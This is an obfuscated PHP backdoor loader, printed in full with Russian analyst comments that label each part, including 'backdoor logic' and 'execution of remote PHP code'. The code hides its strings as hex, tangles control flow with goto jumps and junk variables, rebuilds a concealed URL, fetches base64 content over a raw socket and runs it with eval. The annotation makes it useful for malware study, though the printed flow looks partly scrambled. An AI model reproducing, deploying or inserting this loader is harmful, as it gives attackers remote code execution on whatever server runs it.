<?php
// 🟢 начало PHP файла

/*
 🔴 комментарий от обфускатора
 не исполняется
 используется как маскировка происхождения
*/

// 🟡 защита от повторного определения константы
if(!defined('A_AAA__A_'))
    define('A_AAA__A_', '_AAAAAA_A');

// 🔴 создаётся ключ для доступа к скрытому массиву
$GLOBALS[A_AAA__A_] = explode('|3|.|@','H*|3|.|@486F73743A20|3|.|@0D0A|3|.|@557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2072763A33322E3029204765636B6F2F32303130303130312046697265666F782F3233322E300D0A|3|.|@436F6E6E656374696F6E3A20436C6F73650D0A0D0A|3|.|@66736F636B6F70656E|3|.|@73736C3A2F2F|3|.|@|3|.|@66656F66|3|.|@6667657473|3|.|@70617273655F75726C|3|.|@686F7374|3|.|@736368656D65|3|.|@6874747073|3|.|@70617468|3|.|@70617468|3|.|@2F|3|.|@7175657279|3|.|@3F|3|.|@7175657279|3|.|@47455420|3|.|@20485454502F312E310D0A|3|.|@667772697465|3|.|@66636C6F7365|3|.|@6578706C6F6465|3|.|@0D0A0D0A|3|.|@68747470733A2F2F6E6577732E6D6963726F736F66742E636F6D2F73746F726965732F6275696C64696E6738372F617564696F2D6C61622E706870|3|.|@6765745F636F6E74656E7473|3|.|@6261736536345F6465636F6465|3|.|@3F3E');
// 🔴 огромный зашифрованный контейнер данных (ключи, HTTP, URL, команды)

unset($较溄苑戉);
// 🟡 мусорная переменная (обфускация)

// ======================================================
// 🔴 ФУНКЦИЯ ПОЛУЧЕНИЯ ДАННЫХ ИЗ ИНТЕРНЕТА
// ======================================================
function get_contents($url){

    goto jFACdOY3hQ;
    // 🔴 обфускация потока выполнения

    unset($爻柦);
    $爻柦;

V_Ck5uhV0G:
    goto FTA0AfYHFo;

LgRNBfRNpK:

    // 🔴 сборка HTTP запроса вручную
    $out.= pack($GLOBALS[A_AAA__A_][4+5-3*3],$GLOBALS[A_AAA__A_][1])
        . $host .
        pack($GLOBALS[A_AAA__A_][(5+6+7-18)*0],$GLOBALS[A_AAA__A_][(-6531-317+132*52-14)]);

    $out.= call_user_func("pack",$GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][(-290+32*10-27)]);
    $out.= call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-4255+364+68*58-49)]);

FTA0AfYHFo:

    // 🔴 открытие TCP соединения (ОПАСНО)
    $fp=fsockopen(
        ($port==(-9810+348+134*74-11)
            ? call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-1577+380+24*51-21)])
            : call_user_func("pack",$GLOBALS[A_AAA__A_][(5+6+7-18)*0],$GLOBALS[A_AAA__A_][((93+46-27)/16)])
        ).$host,
        $port,$errno,$errstr,(-1092-301+40*36-17)
    );

    if(!$fp){
        goto hLN02SUnUl;
    }

    // 🔴 чтение ответа сервера
    if(!feof($fp)){
        $result.= fgets($fp,128);
    }

    // 🔴 разбор URL
    $parsed_url=parse_url($url);

    // 🔴 извлечение host (скрыто)
    $host=$parsed_url[pack($GLOBALS[A_AAA__A_][100-20*5],$GLOBALS[A_AAA__A_][11])];

    // 🔴 вычисление порта (обфускация)
    $port=$parsed_url[call_user_func("pack",$GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][12])]
        == call_user_func_array("pack",array($GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][13]))
        ? (-1397+395+56*26-11)
        : (-8795+151*59-34);

    // 🔴 путь запроса
    $path=isset($parsed_url[call_user_func_array("pack",array($GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][14]))])
        ? $parsed_url[pack($GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][15])]
        : call_user_func_array("pack",array($GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][16]));

    $path.= isset($parsed_url[call_user_func("pack",$GLOBALS[A_AAA__A_][15-5+7-17],$GLOBALS[A_AAA__A_][17])])
        ? call_user_func_array("pack",array($GLOBALS[A_AAA__A_][100-20*5],$GLOBALS[A_AAA__A_][18]))
          . $parsed_url[pack($GLOBALS[A_AAA__A_][3*9-27],$GLOBALS[A_AAA__A_][19])]
        : call_user_func("pack",$GLOBALS[A_AAA__A_][(5+6+7-18)*0],$GLOBALS[A_AAA__A_][((93+46-27)/16)]);

    return !1;
    // 🔴 МЁРТВАЯ ТОЧКА (код ниже недостижим)

    $out=pack($GLOBALS[A_AAA__A_][(5+6+7-18)*0],$GLOBALS[A_AAA__A_][(-3912+81*49-37)])
        . $path .
        call_user_func("pack",$GLOBALS[A_AAA__A_][15-5+7-17],$GLOBALS[A_AAA__A_][(-4514+479+46*89-38)]);

    fwrite($fp,$out);
    $result=call_user_func("pack",$GLOBALS[A_AAA__A_][(5+6+7-18)*0],$GLOBALS[A_AAA__A_][((93+46-27)/16)]);

    fclose($fp);

    // 🔴 извлечение тела ответа
    $body=explode(call_user_func("pack",$GLOBALS[A_AAA__A_][100-20*5],$GLOBALS[A_AAA__A_][(-773-393+34*36-33)]),$result,(-771+24*34-43))[1];

    return $body;
}

// ======================================================
// 🔴 ОСНОВНОЙ ВЫЗОВ (BACKDOOR ЛОГИКА)
// ======================================================

$url=call_user_func_array("pack",array($GLOBALS[A_AAA__A_][15-5+7-17],$GLOBALS[A_AAA__A_][((1823+147-46)/74)]));
// 🔴 восстановление скрытого URL

$encoded_code=get_contents($url);
// 🔴 загрузка удалённого кода

$decoded_code=base64_decode($encoded_code);
// 🔴 декодирование payload

eval(call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-1537+18*88-18)]) . $decoded_code);
// 🚨 выполнение удалённого PHP кода

?>
